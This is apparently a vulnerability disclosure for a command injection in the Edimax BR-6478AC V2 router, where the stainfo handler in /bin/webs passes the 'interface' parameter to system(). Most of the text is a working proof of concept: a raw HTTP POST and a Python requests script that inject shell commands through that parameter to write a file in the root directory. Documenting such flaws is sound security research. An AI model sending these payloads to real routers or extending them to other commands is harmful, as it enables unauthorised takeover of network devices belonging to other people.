## Firmware download

You can download BR-6478AC V2 from [here](https://www.edimax.com/edimax/download/download/data/edimax/global/download/wireless_routers_ac1200/br-6478ac_v2).

## Analyze

The ```stainfo``` function in ```/bin/webs``` can receive the command parameter and execute it using ```system```function.

![fig1](.\image\4.png)

Using ```FirmAE``` to simulate firmware, capture packets with ```BurpSuite```, and  modify the ```interface``` parameter, successfully create the file  ```vuln.txt``` in the root directory.

![](.\image\5.png)

## POC

burpsuite packet.

```shell
POST /goform/stainfo HTTP/1.1
Host: 192.168.2.1
Content-Length: 83
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.2.1
Referer: http://192.168.2.1/probe.asp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

interface=ens33%20show%20stainfo%20%7C%20touch%20%2Fvuln.txt%20%7C%20iwpriv%20ens33
```

python script

```python
import requests

url = "http://192.168.2.1/goform/stainfo"

payload = {
    "interface": "ens33 show stainfo | echo hacker > /vuln.txt | iwpriv ens33"
}

r = requests.post(url, data=payload)
print(r.status_code)

```



